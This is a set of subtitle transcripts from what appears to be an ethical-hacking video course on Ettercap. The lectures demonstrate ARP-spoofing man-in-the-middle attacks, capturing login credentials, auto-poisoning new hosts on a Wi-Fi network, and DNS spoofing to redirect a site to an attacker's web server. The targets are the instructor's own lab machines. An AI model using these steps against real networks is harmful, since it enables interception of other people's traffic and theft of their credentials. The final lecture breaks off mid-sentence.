00:03:04,260 --> 00:03:06,630
And we're ready to use the tool now.

46
00:03:07,380 --> 00:03:10,470
As usual, before we use it, we're going to do Ettercap.

47
00:03:12,350 --> 00:03:14,310
The name of the tool followed by.

48
00:03:14,330 --> 00:03:14,840
Dash, dash.

49
00:03:14,840 --> 00:03:17,390
Help to see all the options that we can set.

50
00:03:17,810 --> 00:03:23,000
Now, as you can see, the format of the options is very similar to what we usually get.

51
00:03:23,270 --> 00:03:29,450
First of all, the usage of the tool you have to type in ettercap followed by the options which are

52
00:03:29,450 --> 00:03:33,770
in here, followed by the target, the first target and the second target.

53
00:03:33,770 --> 00:03:35,390
And we'll talk about that later.

54
00:03:36,480 --> 00:03:38,190
You can see the way to use the options.

55
00:03:38,190 --> 00:03:43,950
You can either use the dash option and capital or dash dash option name and then follow it by the option

56
00:03:43,950 --> 00:03:46,680
value, just like any other tool in Linux.

57
00:03:47,590 --> 00:03:49,780
We'll be using these options later on.

58
00:03:49,810 --> 00:03:55,870
Now, what I want to show you before I start using any options is the user interface type.

59
00:03:55,870 --> 00:04:00,240
So the tool actually has a number of interfaces that you can use.

60
00:04:00,250 --> 00:04:07,090
So you can use you can use dash T to use the text mode and you can set that to quiet and that's what

61
00:04:07,090 --> 00:04:08,290
we're going to do.

62
00:04:08,950 --> 00:04:16,930
You can also use the curses UI, you can demonize cap and run it as a daemon in the background, or

63
00:04:16,930 --> 00:04:22,870
you can use the GTK, which is a graphical interface for the tool and will not be using that because

64
00:04:22,870 --> 00:04:27,130
I actually like using the text mode, I think it's easier and faster.

65
00:04:28,150 --> 00:04:31,450
So let's run ettercap without any options.

66
00:04:31,450 --> 00:04:36,220
And just I want to show you the interactive text mode that it has and how to use it.

67
00:04:36,940 --> 00:04:39,040
So we're just going to do Ettercap.

68
00:04:40,900 --> 00:04:47,600
Followed by capital T small Q to tell it, we want a text mode and we want that text mode to be quiet

69
00:04:47,620 --> 00:04:50,470
and then we're not going to specify any targets.

70
00:04:50,470 --> 00:04:53,380
So I'm just going to put three forward slashes.

71
00:04:53,380 --> 00:04:56,470
So that means I don't want to specify any targets.

72
00:04:56,470 --> 00:04:58,720
I just want you to run the program for me.

73
00:04:59,290 --> 00:05:01,060
So let's hit Enter.

74
00:05:05,320 --> 00:05:12,010
And as you can see, this automatically searched for hosts or connected clients, and it discovered

75
00:05:12,010 --> 00:05:14,680
four hosts or four connected clients.

76
00:05:14,680 --> 00:05:19,660
So this is similar to what Net Discover did for us when we used it before.

77
00:05:20,440 --> 00:05:25,240
So as you can see, it's telling you to hit H for inline help.

78
00:05:25,240 --> 00:05:31,300
And if you just if I just press H from my keyboard, you'll see I'll get a list of all the commands

79
00:05:31,300 --> 00:05:32,340
that I can use.

80
00:05:32,350 --> 00:05:38,050
So like I said, this is an interactive text mode and I can literally just put the letters related to

81
00:05:38,050 --> 00:05:41,080
the thing that I want to do and it'll do it for me.

82
00:05:41,740 --> 00:05:45,480
So you can see I can use V to change the visualization mode.

83
00:05:45,490 --> 00:05:48,040
I can use P to activate a plugin.

84
00:05:48,040 --> 00:05:49,780
I will talk about plugins later.

85
00:05:49,780 --> 00:05:53,860
We can use F to activate a filter and again we'll talk about that later.

86
00:05:53,890 --> 00:06:00,220
We can do L to list all the hosts or the connected clients and I'm going to do that, so I'm just going

87
00:06:00,220 --> 00:06:01,360
to press on L.

88
00:06:02,590 --> 00:06:07,110
And as you can see, it lists all the connected clients to my network.

89
00:06:07,120 --> 00:06:11,350
So it lists their IP and their Mac address.

90
00:06:11,710 --> 00:06:18,340
So like I said, this result is very similar to the result of Net Discover, and it's a cool little

91
00:06:18,340 --> 00:06:23,710
thing to have it here that you can search for connected clients within the same tool that you can use

92
00:06:23,710 --> 00:06:27,520
to run the ARP spoofing or man in the middle attack.

93
00:06:28,610 --> 00:06:31,910
You can also use to print profiles.

94
00:06:31,910 --> 00:06:36,380
Use C to print connections and use s to print the interfaces.

95
00:06:36,470 --> 00:06:38,750
Space to stop printing packets.

96
00:06:38,750 --> 00:06:40,760
But we don't have any packets anyway.

97
00:06:40,760 --> 00:06:42,260
And Q to quit.

98
00:06:42,350 --> 00:06:44,450
So what I'm going to do now, I'm just going to press on.

99
00:06:44,450 --> 00:06:48,440
Q to quit the program because I haven't executed any attacks.

100
00:06:48,440 --> 00:06:53,090
As you remember, the command I run was literally ettercap text mode quiet.

101
00:06:53,090 --> 00:06:55,400
So that's all we told the program to do.

102
00:06:55,880 --> 00:07:02,690
So for now, I just wanted to give you a basic overview of Ettercap its text interface, how to interact

103
00:07:02,690 --> 00:07:03,290
with it.

104
00:07:03,290 --> 00:07:09,050
And in the next lecture I'm going to show you how to run an ARP spoofing attack against this target.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,850 --> 00:00:01,450
All right.

2
00:00:01,480 --> 00:00:08,410
Now, in the last lecture I showed you an overview of the basic usage of Intercap and we seen how we

3
00:00:08,410 --> 00:00:11,080
can list all the hosts connected to the network.

4
00:00:11,080 --> 00:00:14,540
And then we said that this is my Windows machine.

5
00:00:14,560 --> 00:00:16,360
Now, let me confirm that to you.

6
00:00:16,360 --> 00:00:21,580
So I'm going to go to the target machine in here and I'm just going to do Ipconfig.

7
00:00:22,490 --> 00:00:24,310
So you can see this is its IP.

8
00:00:24,350 --> 00:00:26,090
Ten 2259.

9
00:00:26,450 --> 00:00:30,740
And we can see the gateway is at ten 2251.

10
00:00:31,650 --> 00:00:33,450
Now also if I do a.

11
00:00:35,130 --> 00:00:38,370
To see the the entries for this machine.

12
00:00:38,370 --> 00:00:41,460
You can see the Mac address of the router in here.

13
00:00:41,790 --> 00:00:48,690
So let's go to the Kali machine, run an ARP spoofing attack and see if the Mac address in here is going

14
00:00:48,690 --> 00:00:49,470
to change.

15
00:00:50,100 --> 00:00:54,660
Now, before I do that, I actually want to show you I'm going to split the screen here.

16
00:00:55,600 --> 00:01:03,160
And I want to show you that I'm going to be using I'm going to do ifconfig eth0 so you can see that

17
00:01:03,160 --> 00:01:08,770
I'm going to be using Eth0, which is a virtual interface connected to my Nat network.

18
00:01:09,100 --> 00:01:14,500
Again, when run an ARP spoofing attack, you have to be on the same subnet as the target.

19
00:01:14,500 --> 00:01:22,170
So we see that the target is at 1022, 15 nine and I'm connected to 1022, 15 eight.

20
00:01:22,180 --> 00:01:26,350
So the first three parts of the of the IP are the same.

21
00:01:27,220 --> 00:01:31,060
You can run this attack against any wireless network.

22
00:01:31,060 --> 00:01:35,710
Just make sure that you're connected, that your target is connected to the same wireless network as

23
00:01:35,710 --> 00:01:40,960
you and make sure you can see your interface when you're on ifconfig and make sure it has an IP address

24
00:01:40,960 --> 00:01:42,760
that is on the same subnet.

25
00:01:42,790 --> 00:01:46,720
Now, I covered all of this before, so I'm not going to go into too much detail of it.

26
00:01:46,720 --> 00:01:48,520
I just want to remind you of that.

27
00:01:49,400 --> 00:01:55,940
So let's go back to the Ettercap command and see how we can run an ARP spoofing attack.

28
00:01:56,450 --> 00:01:59,400
So so far we have Ettercap TCU.

29
00:02:00,370 --> 00:02:05,170
Which means that we want to run a quiet text mode like we seen in the previous lecture.

30
00:02:05,290 --> 00:02:12,220
And I'm going to use Dash Capital M to specify the mode of the attack that I want to run.

31
00:02:12,220 --> 00:02:14,410
So if we go up to the help.

32
00:02:15,890 --> 00:02:20,510
You will see we have the M specifies the man in the middle method.

33
00:02:21,200 --> 00:02:26,540
So I'm going to use the dash m argument to specify the man in the middle method.

34
00:02:27,140 --> 00:02:31,430
And what we want to do is we want to do an ARP spoofing attack.

35
00:02:31,430 --> 00:02:34,040
So I'm going to do a ARP remote.

36
00:02:35,060 --> 00:02:42,290
Then I'm going to use Dash AI to specify the interface and make sure you select the interface that's

37
00:02:42,290 --> 00:02:44,780
connected to the same network as the target.

38
00:02:44,780 --> 00:02:50,000
So as I said, it needs to have an IP address that is similar to the target one.

39
00:02:50,210 --> 00:02:56,660
So the first three parts of its IP address need to be the same as the first three parts of the IP of

40
00:02:56,660 --> 00:02:57,500
the target.

41
00:02:57,710 --> 00:03:00,230
In my case, it's eth0.

42
00:03:01,010 --> 00:03:06,440
Again, if you're connecting, if you're targeting a wireless network, then you need to use LAN zero,

43
00:03:06,440 --> 00:03:11,720
which should be your wireless interface or whatever the name of your wireless interface is.

44
00:03:13,100 --> 00:03:16,460
And finally, we need to specify the targets.

45
00:03:16,670 --> 00:03:18,680
And let me talk about this for a second.

46
00:03:18,680 --> 00:03:24,050
So the targets are going to go in the form of two groups, as we've seen in the command.

47
00:03:24,050 --> 00:03:30,320
So I'm just going to go up to the command real quick and you can see the usage is ettercap, followed

48
00:03:30,320 --> 00:03:33,110
by the options and followed by the targets.

49
00:03:33,110 --> 00:03:38,150
And the targets are split into two groups Group one and group two.

50
00:03:39,100 --> 00:03:45,490
Now to specify these groups in the command, you can just do three forward slashes like I did before,

51
00:03:45,490 --> 00:03:49,240
and that will target all the connected clients in the network.

52
00:03:49,990 --> 00:03:52,660
Or you can use the groups.

53
00:03:52,660 --> 00:03:59,260
So you need to do three forward slashes for group one and then three forward slashes for group two.

54
00:04:00,160 --> 00:04:07,600
Now the way to use these forward slashes is you need to put the IP address between the first two forward

55
00:04:07,600 --> 00:04:08,380
slashes.

56
00:04:09,270 --> 00:04:19,980
So my gateway is at 1022, 15 one and my target is at ten 2259.

57
00:04:20,950 --> 00:04:25,000
Now you might be wondering, what are these other forward slashes for?

58
00:04:25,030 --> 00:04:31,840
Well, the first part so the first part in here, this one where I'm typing the A's, this is where

59
00:04:31,840 --> 00:04:34,390
you can specify the Mac addresses.

60
00:04:35,110 --> 00:04:39,640
The second part in here, this is where we put the IP and that's the one we're using.

61
00:04:39,700 --> 00:04:43,600
The third part here is for IP version six.

62
00:04:43,750 --> 00:04:49,840
So if you want to target and if you want to use IP version six, then this is where you should put it.

63
00:04:49,840 --> 00:04:54,790
And finally, you can put the ports after the last forward slash in here.

64
00:04:55,790 --> 00:04:57,810
But we'll always be using the IPS.

65
00:04:57,830 --> 00:05:01,250
So this is always going to be the form that we use.

66
00:05:01,490 --> 00:05:10,850
And basically the whole idea is you want to put the gateway on one side and you want to put the target

67
00:05:10,850 --> 00:05:16,190
on the other group so it doesn't matter which one's which, whether you put the target first or the

68
00:05:16,190 --> 00:05:17,540
gateway first.

69
00:05:17,540 --> 00:05:25,040
But the main idea is you want the target to be in one group and then the gateway in another group.

70
00:05:26,050 --> 00:05:29,770
You can also use ranges in the targets.

71
00:05:29,770 --> 00:05:35,320
So for example, you can do ten 2259 dash 20.

72
00:05:35,830 --> 00:05:43,360
And what this will do is it will target all the IPS from 1020 to 50 9 to 10, 20 to 1520.

73
00:05:43,390 --> 00:05:49,780
So that will include ten, 20 to 15, ten, 11, 12, 13, all the way up to 20.

74
00:05:49,810 --> 00:05:56,680
Instead of typing them all in here, you can also use a comma to separate IPS.

75
00:05:56,710 --> 00:06:05,380
So if we do ten, 20 to 15, nine followed by ten, 20 to 50 and ten, then that will target both of

76
00:06:05,380 --> 00:06:06,760
these IPS for me.

77
00:06:06,760 --> 00:06:10,360
And then I can add another comma and add more targets and so on.

78
00:06:11,350 --> 00:06:11,740
All right.

79
00:06:11,740 --> 00:06:12,970
Now the command is done.

80
00:06:12,970 --> 00:06:17,080
And I know I talked about it a lot, but it's actually very simple.

81
00:06:17,080 --> 00:06:18,610
And we're going to be using it a lot.

82
00:06:18,610 --> 00:06:21,040
So it's going to become very easy for you.

83
00:06:21,400 --> 00:06:26,740
I'm actually just going to delete this target here and I'm just going to go over the command one more

84
00:06:26,740 --> 00:06:27,370
time.

85
00:06:27,580 --> 00:06:30,670
So we're doing Ettercap, which is the name of the tool.

86
00:06:31,320 --> 00:06:36,480
We're telling it that we want to use a text mode and we want that text mode to be quiet.

87
00:06:36,480 --> 00:06:38,400
So we're doing a quiet text mode.

88
00:06:38,730 --> 00:06:41,760
Then we had to specify the man in the middle method.

89
00:06:41,760 --> 00:06:49,500
Like I said, it supports a number of methods and what we want to do is we want to do a remote, which

90
00:06:49,500 --> 00:06:52,770
basically means we want to do an ARP poisoning attack.

91
00:06:53,070 --> 00:06:58,890
We're specifying the interface using the I argument and we're using eth0.

92
00:06:59,460 --> 00:07:01,890
Then we're given the targets.

93
00:07:01,890 --> 00:07:07,080
And like I said, the main the main thing that you want to keep in mind is you need to keep to put the

94
00:07:07,080 --> 00:07:10,650
gateway in one group and then your targets in the other group.

95
00:07:11,460 --> 00:07:14,520
Once done with all of this, I'm going to hit enter.

96
00:07:16,170 --> 00:07:18,270
And that Iran ettercap for me.

97
00:07:18,990 --> 00:07:24,720
One thing you want to confirm after the tool runs is make sure that Group one and Group two have been

98
00:07:24,720 --> 00:07:25,830
added correctly.

99
00:07:26,550 --> 00:07:27,740
Now we're ready.

100
00:07:27,750 --> 00:07:33,450
The tool should have done an ARP spoofing attack, so the Mac address of the router at the client should

101
00:07:33,450 --> 00:07:39,030
have changed to the Mac address of this computer and it also automatically starts a sniffer for us.

102
00:07:39,030 --> 00:07:44,070
So whenever the target person logs in to a service, it should show it to us in here.

103
00:07:44,580 --> 00:07:52,020
So let's go to the target system and before I go and log into anything, I'm just going to run a.

104
00:07:53,440 --> 00:07:59,590
And as you can see, the Mac address of the router has changed or of the gateway has changed to the

105
00:07:59,590 --> 00:08:01,680
Mac address of the Kali machine.

106
00:08:01,690 --> 00:08:05,940
It used to be this and now it changed to this.

107
00:08:05,950 --> 00:08:08,740
So the ARP spoofing attack is working.

108
00:08:09,370 --> 00:08:13,870
Now let's go and try to log in to something and see if it will detect it for us.

109
00:08:14,140 --> 00:08:20,890
So I'm going to I'm going to go to a Http only website and then we'll talk about Https later.

110
00:08:21,160 --> 00:08:23,620
So I'm going to go to Bing.com.

111
00:08:26,310 --> 00:08:30,390
And I'm going to look for Dictionary.com login.

112
00:08:32,070 --> 00:08:34,230
Now I'm going to go to the first result.

113
00:08:35,520 --> 00:08:40,800
Now it's actually getting me the meaning of log in, but I want to go to the login page, so I'm going

114
00:08:40,800 --> 00:08:42,360
to go here on the top, right?

115
00:08:44,980 --> 00:08:49,210
And I'm going to set my username to say that I security.org.

116
00:08:51,010 --> 00:08:56,260
And said the password to one, two, three, four, five, six hit enter.

117
00:08:56,710 --> 00:09:03,460
And now if we go to the Kali machine, you'll see that the automatic sniffer that Ettercap started for

118
00:09:03,460 --> 00:09:06,190
me captured a username called Zaidi.

119
00:09:06,220 --> 00:09:12,670
Security.org password is one, two, three, four, five, six and the login was already made to this

120
00:09:12,670 --> 00:09:13,420
page.

121
00:09:13,990 --> 00:09:16,060
Now again, this is nothing new.

122
00:09:16,090 --> 00:09:21,130
You already know how to do this using man in the middle life and you already know how to manually find

123
00:09:21,130 --> 00:09:22,600
this using Wireshark.

124
00:09:22,630 --> 00:09:27,580
The reason why I'm showing you how to do this with Ettercap because I want to use this tool for more

125
00:09:27,580 --> 00:09:29,230
advanced stuff in the future.

126
00:09:29,230 --> 00:09:31,730
So I want to cover the basics right now.

127
00:09:31,750 --> 00:09:39,610
Also, like I said, if you are facing issues with man in the middle or if it's not acting as expected,

128
00:09:39,610 --> 00:09:43,330
then you can try Ettercap as a more stable option.

129
00:09:43,330 --> 00:09:49,450
For me, both work well, but if man in the middle life isn't working that great, then you can go with

130
00:09:49,450 --> 00:09:50,290
Ettercap.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,510 --> 00:00:04,200
In this lecture I'd like to talk about ettercap plugins.

2
00:00:05,010 --> 00:00:10,140
Ettercap has a number of plugins that allow you to do various things.

3
00:00:10,830 --> 00:00:13,620
Using the plugins is pretty much the same.

4
00:00:13,620 --> 00:00:18,390
That's why in this lecture and the next lecture, I'm just going to show you two examples.

5
00:00:18,390 --> 00:00:24,390
I'm going to show you how to list the plugins, configure them and use them and then you can in your

6
00:00:24,390 --> 00:00:27,690
own time experiment and use the other plugins.

7
00:00:28,170 --> 00:00:34,320
So the first plugin that I want to have a look on is a very simple plugin that's called Auto Add.

8
00:00:35,160 --> 00:00:39,990
This plugin allows you to automatically add new hosts to the list.

9
00:00:40,350 --> 00:00:44,220
So let's say you are targeting the whole network, the whole subnet.

10
00:00:44,250 --> 00:00:50,700
Then if people connect to this network after you run the attack, then you won't be able to target them

11
00:00:50,700 --> 00:00:55,140
because you only poison the targets whenever you run the Ettercap command.

12
00:00:55,650 --> 00:01:02,470
So what this plugin does is when it it'll keep listening and whenever a new computer connects to the

13
00:01:02,470 --> 00:01:08,620
network, it will automatically add it to the host list so that it will get poisoned and then you'll

14
00:01:08,620 --> 00:01:11,740
be able to run all the man in the middle attacks that you want.

15
00:01:12,340 --> 00:01:14,200
So let me show you how to do this.

16
00:01:15,040 --> 00:01:20,890
And as a plus, I'm actually going to be running ettercap this time against a real Wi-Fi network.

17
00:01:20,890 --> 00:01:27,850
So in all of the previous examples, we were running Ettercap against the virtual Ethernet network,

18
00:01:27,850 --> 00:01:33,340
which works exactly like a real Ethernet network and exactly like a Wi-Fi network as well.

19
00:01:33,760 --> 00:01:39,130
But just to prove to you that this works against real networks as well, I wanted to run this attack

20
00:01:39,250 --> 00:01:41,530
against a real Wi-Fi network.

21
00:01:42,100 --> 00:01:50,650
So just to show you here, if I go on devices and network, you'll see the network adapter in here is

22
00:01:50,650 --> 00:01:54,670
not checked, which means that it's not connected to the Nat network.

23
00:01:55,480 --> 00:02:01,990
Now, if you look at the USB, you'll see I've connected my wireless adapter in here and I've already

24
00:02:01,990 --> 00:02:07,810
connected to my target network by going to the Wi-Fi clicking here, select network.

25
00:02:07,810 --> 00:02:11,290
And I've connected to my network, which is called Test Network.

26
00:02:12,260 --> 00:02:14,300
So if we do ifconfig right now.

27
00:02:16,910 --> 00:02:22,070
You'll see that H0 does not have an IP address, which means it's not connected to anything.

28
00:02:22,310 --> 00:02:27,530
And you can see that my LAN zero has an IP address and it's connected to a network.

29
00:02:27,830 --> 00:02:33,650
Now my target Windows machine is actually not connected to anything right now, so it's not connected

30
00:02:33,650 --> 00:02:36,700
to the Nat network nor to the WiFi network.

31
00:02:36,710 --> 00:02:41,240
And the reason for this is because I want to show you the auto Add plugin.

32
00:02:41,240 --> 00:02:46,400
So what I'm going to do is I'm going to run the ether cap command and then I'm going to connect to show

33
00:02:46,400 --> 00:02:53,120
you that with this plugin, people will be automatically poisoned even if they connect after we run

34
00:02:53,120 --> 00:02:54,470
the ether cap Command.

35
00:02:54,950 --> 00:03:03,290
So let's go back to Kali and I'm going to run the exact same command that we were using before, but

36
00:03:03,290 --> 00:03:06,860
I'm first going to modify the interface here to LAN zero.

37
00:03:09,000 --> 00:03:11,520
Because that's the my wireless interface.

38
00:03:12,090 --> 00:03:17,850
And also I'm going to delete the targets here because we said in this scenario, we're pretending that

39
00:03:17,850 --> 00:03:23,790
we want to target the whole subnet and then we'll see how we can automatically add people when they

40
00:03:23,790 --> 00:03:24,510
connect.

41
00:03:25,320 --> 00:03:33,000
So now the attack is run and the waiter cap works is it would poison all the connected devices whenever

42
00:03:33,000 --> 00:03:34,140
you run the command.

43
00:03:34,170 --> 00:03:36,210
So if I do help.

44
00:03:36,860 --> 00:03:43,490
And then if I do l to list all the hosts, you can see that I have two IP addresses and these are the

45
00:03:43,490 --> 00:03:46,160
only two IP addresses that have been poisoned.

46
00:03:46,160 --> 00:03:50,840
So these are the only two IP addresses that I can run my man in the middle attacks against.

47
00:03:51,230 --> 00:03:56,420
Now, to use the plugin that I'm talking about, the auto add plugin, first of all, we need to press

48
00:03:56,450 --> 00:03:58,970
P to see the plugins as you can see here.

49
00:04:00,680 --> 00:04:03,930
And as you can see, we have a long list of plug ins.

50
00:04:03,950 --> 00:04:08,150
The zero here means that this plugin is inactive.

51
00:04:08,390 --> 00:04:10,490
You can see the plugin name here.

52
00:04:10,610 --> 00:04:15,950
The plugin version and a description about what does this plugin do?

53
00:04:17,330 --> 00:04:22,060
So the plugin that I want to show you an example of is the auto ad, which is this one.

54
00:04:22,070 --> 00:04:23,930
And as you can see, it says zero.

55
00:04:23,930 --> 00:04:30,410
So it's inactive and you can say that it says it automatically add new victims to the target range.

56
00:04:30,860 --> 00:04:35,690
So to activate this plugin, all we have to do is just type its name right now.

57
00:04:35,690 --> 00:04:37,820
So I'm just going to do as you can see.

58
00:04:37,850 --> 00:04:40,190
It's telling me what's the plugin name that I want to use.

59
00:04:40,220 --> 00:04:42,560
I'm going to say I want to use auto ad.

60
00:04:44,730 --> 00:04:51,780
Now the plugin is active, as you can see now it says activating auto Add plugin and basically now whenever

61
00:04:51,780 --> 00:04:56,100
someone connects to the network, they will be automatically poisoned.

62
00:04:56,100 --> 00:05:01,620
So without this plugin, if new people connect to the network, they will not be added to my target

63
00:05:01,620 --> 00:05:05,640
list and I won't be able to run my man in the middle attacks against them.

64
00:05:06,190 --> 00:05:10,360
So let's go to the Windows machine and connect to the network.

65
00:05:13,970 --> 00:05:16,220
And as you can see, we're connected now.

66
00:05:16,580 --> 00:05:20,780
So let's go to the Kali machine and see what happened.

67
00:05:22,330 --> 00:05:28,420
As you can see, we have a message from the Auto Add plugin and it's telling us that it automatically

68
00:05:28,420 --> 00:05:33,910
added a computer that has an IP of 19216823 to the list.

69
00:05:34,180 --> 00:05:37,690
So if I list again by pressing L on the keyboard.

70
00:05:38,540 --> 00:05:41,150
You'll see that I have more targets right now.

71
00:05:41,150 --> 00:05:47,930
And basically the target that I'm interested in is this one, which is 119216823.

72
00:05:47,960 --> 00:05:50,660
It's been automatically added to the list now.

73
00:05:50,660 --> 00:05:57,620
And right now all the traffic sent to and from that computer will be sent through my Kali machine.

74
00:05:57,620 --> 00:05:59,840
So now I'm the man in the middle.

75
00:06:00,440 --> 00:06:02,960
Now let me show you a quick proof of that.

76
00:06:05,150 --> 00:06:07,790
So I'm just going to go to Dictionary.com.

77
00:06:14,210 --> 00:06:15,320
And login.

78
00:06:16,920 --> 00:06:18,210
Put the email.

79
00:06:23,060 --> 00:06:25,670
And as you can see, we managed to sniff it here.

80
00:06:26,390 --> 00:06:32,420
So the whole point of this lecture was just to show you a very simple example of how to use a plugin.

81
00:06:32,420 --> 00:06:38,060
And this plugin is actually very handy if you're trying to target the whole subnet because like I said,

82
00:06:38,060 --> 00:06:43,910
if you don't use it, then when computers connect to the subnet after running the command, they will

83
00:06:43,910 --> 00:06:46,860
not be added to the list and they will not be poisoned.

84
00:06:46,880 --> 00:06:52,310
So this plugin is kind of essential if you are trying to target the whole subnet.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,450 --> 00:00:04,860
Now using most of the other plugins is very similar to using the auto add.

2
00:00:04,890 --> 00:00:08,160
All you have to do is just type its name and activate it.

3
00:00:08,850 --> 00:00:15,690
In this lecture I want to show you how to use the DNS spoof plugin because there is just one more step

4
00:00:15,690 --> 00:00:18,120
of configuration before you can use it.

5
00:00:18,240 --> 00:00:24,180
And because it's a really handy plugin to use, I'll also show you a slightly different way of activating

6
00:00:24,180 --> 00:00:26,400
it just as a plus to this lecture.

7
00:00:26,940 --> 00:00:29,940
Now you should know by now what DNS spoofing does.

8
00:00:29,970 --> 00:00:35,520
Basically, it allows us to redirect requests from one website to another.

9
00:00:35,520 --> 00:00:42,210
For example, we can redirect any requests to hotmail.com and we can send it to any other web server,

10
00:00:42,210 --> 00:00:47,480
even if it's our local web server, and then host a fake web page on it, for example.

11
00:00:47,490 --> 00:00:51,540
So it can actually be used for so many scenarios and we've used it before.

12
00:00:51,540 --> 00:00:57,240
So this is just to show you how to use the DNS spoof plugin that comes with Ettercap for the sake of

13
00:00:57,240 --> 00:00:58,080
completion.

14
00:00:59,060 --> 00:01:05,960
Now, first of all, before we can use the plugin, you have to modify the Iter DNS file to add the

15
00:01:05,960 --> 00:01:08,300
DNS records that you want to use.

16
00:01:08,330 --> 00:01:10,640
So to do that, I'm going to use Leafpad.

17
00:01:12,470 --> 00:01:16,850
And the location of the DNS configuration file is in UTC.

18
00:01:18,040 --> 00:01:19,090
Ettercap.

19
00:01:20,920 --> 00:01:21,940
Dot DNS.

20
00:01:24,100 --> 00:01:25,810
So I'm going to scroll down.

21
00:01:27,390 --> 00:01:31,500
And the one that you want to be modifying is the A records in here.

22
00:01:32,670 --> 00:01:35,910
Now, as you can see, I've actually already modified this.

23
00:01:35,910 --> 00:01:43,020
So what I have here is I have Bing.com and I have an A to say that this is an A record and this is the

24
00:01:43,020 --> 00:01:49,470
type of DNS records that's responsible for resolving domain names into IP addresses.

25
00:01:50,160 --> 00:01:54,030
And I'm redirecting this to the IP of this computer.

26
00:01:54,030 --> 00:01:57,210
This is the IP of my Kali machine right now.

27
00:01:58,360 --> 00:02:04,620
Again, I'm doing another rule here, and this rule is to show you an example of using a wild card.

28
00:02:04,630 --> 00:02:07,600
So you can you can see I have a star in here.

29
00:02:07,600 --> 00:02:10,480
And basically the star means anything.

30
00:02:10,480 --> 00:02:18,850
Any subdomain dot bing.com should be redirected to 19216825, which is again the IP of my Kali machine.

31
00:02:19,510 --> 00:02:21,190
So I'm going to quit this.

32
00:02:22,220 --> 00:02:30,170
And just to show you, if I do ifconfig, you'll see that the IP address of my Kali machine is 19216825.

33
00:02:30,200 --> 00:02:33,410
So that's the IP I was using in the DNS rule.

34
00:02:33,800 --> 00:02:39,290
Now, because I'm redirecting people to my own IP address, then I need to have a web server running

35
00:02:39,320 --> 00:02:41,990
to show a web page to the people.

36
00:02:42,380 --> 00:02:44,390
So I'll need to start my Apache.

37
00:02:44,390 --> 00:02:47,540
And to do that I'm going to do service Apache to start.

38
00:02:48,760 --> 00:02:49,490
And that's it.

39
00:02:49,510 --> 00:02:50,680
Apache is running.

40
00:02:51,010 --> 00:02:53,770
Finally, we'll have to run Ettercap.

41
00:02:54,400 --> 00:03:00,610
So I'm going to use the exact same command that I used in the previous lecture, but this time I'm actually

42
00:03:00,610 --> 00:03:02,200
going to specify a target.

43
00:03:02,200 --> 00:03:09,340
So my target is at 19216823 and the gateway is at.

44
00:03:10,280 --> 00:03:12,590
19216821.

45
00:03:12,980 --> 00:03:13,720
Okay.

46
00:03:13,730 --> 00:03:19,970
And instead of running this and then type in P and then type in the plugin name, if you already know

47
00:03:19,970 --> 00:03:26,300
the name of the plugin that you want to use, you can just do dash capital P and put the plugin name.

48
00:03:26,300 --> 00:03:28,640
And in my case it's called DNS spoof.

49
00:03:32,120 --> 00:03:34,280
So we're using the exact same command.

50
00:03:34,310 --> 00:03:37,780
We're doing ettercap IP remote.

51
00:03:38,270 --> 00:03:43,820
I'm specifying my wireless adapter because like, as you can see, I'm running this against a real wireless

52
00:03:43,820 --> 00:03:44,570
network.

53
00:03:45,320 --> 00:03:51,440
I'm doing dash s to tell Ettercap not to create self-signed SSL certificates.

54
00:03:51,650 --> 00:03:56,500
I'm doing dash P to tell ettercap to activate DNS pool for me.

55
00:03:56,510 --> 00:04:01,580
So instead of the way that we've seen in the previous lecture where we had to press P after Ettercap

56
00:04:01,580 --> 00:04:05,020
runs and then list all the plugins and then put the plugin name.

57
00:04:05,030 --> 00:04:09,890
Right now I know the plugin that I want to run, so I'm just doing dash P DNS spoof.

58
00:04:10,610 --> 00:04:15,740
Then I have the IP of my target followed by the IP of the gateway.

59
00:04:16,340 --> 00:04:17,660
I'm going to hit enter.

60
00:04:19,970 --> 00:04:25,460
And as you can see here at the bottom, it's already telling me that activating DNS spoof plugin.

61
00:04:25,460 --> 00:04:27,710
So it has already activated it for me.

62
00:04:27,710 --> 00:04:29,870
I don't need to do anything right now.

63
00:04:30,320 --> 00:04:38,060
So now anyone in my target list, if they try to go to Bing.com, they'll be redirected to my web server.

64
00:04:38,060 --> 00:04:43,670
And that's why this attack is very handy because it can be used in so many scenarios.

65
00:04:43,670 --> 00:04:50,930
It can be used to serve fake web pages, ask people to download things, serve people, fake updates,

66
00:04:50,930 --> 00:04:51,950
and so on.

67
00:04:52,520 --> 00:04:55,310
So let me go to my target Windows machine.

68
00:04:56,400 --> 00:05:01,290
And I'm going to go to Bing.com and let's see if we get redirected.

69
00:05:04,460 --> 00:05:07,210
And as you can see, DNS spoofing works.

70
00:05:07,220 --> 00:05:13,790
We get redirected to the website that I have on my web server, and this website doesn't really do much.

71
00:05:13,820 --> 00:05:17,240
It just shows you that the DNS spoofing attack is working.

72
00:05:17,780 --> 00:05:18,980
So that's it.

73
00:05:19,110 --> 00:05:23,990
A simple plugin, a simple attack, but it's very handy and very powerful.

74
00:05:24,140 --> 00:05:29,870
And again, this is running against my real WiFi network using real Wi-Fi interfaces.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,170 --> 00:00:01,740
Now.

2
00:00:01,740 --> 00:00:06,420
A really cool feature that Ettercap supports is one way spoofing.

3
00:00:06,900 --> 00:00:14,460
One way spoofing can be used to bypass some security implementations implemented on the router or on

4
00:00:14,460 --> 00:00:15,360
the gateway.

5
00:00:15,690 --> 00:00:22,250
Now before we talk about that, let's just have a quick recap on how ARP spoofing works.

6
00:00:22,260 --> 00:00:24,510
So right here we have a typical network.

7
00:00:24,510 --> 00:00:30,390
We have our hacker, we have our victim, and they're all working peacefully, sending the requests

8
00:00:30,390 --> 00:00:31,530
to the gateway.

9
00:00:31,560 --> 00:00:35,400
The gateway goes to the Internet, sends the responses back to the hacker.

10
00:00:35,520 --> 00:00:37,350
The victim does the same thing.

11
00:00:37,350 --> 00:00:39,600
He sends his request to the access point.

12
00:00:39,630 --> 00:00:45,240
The access point goes to the Internet, gets the requested data, brings it back to the victim.

13
00:00:45,540 --> 00:00:48,930
So that's a typical setup in a network.

14
00:00:49,380 --> 00:00:55,950
Now, if the hacker launches an ARP spoofing attack, he's going to tell the victim that I have the

15
00:00:55,950 --> 00:00:57,350
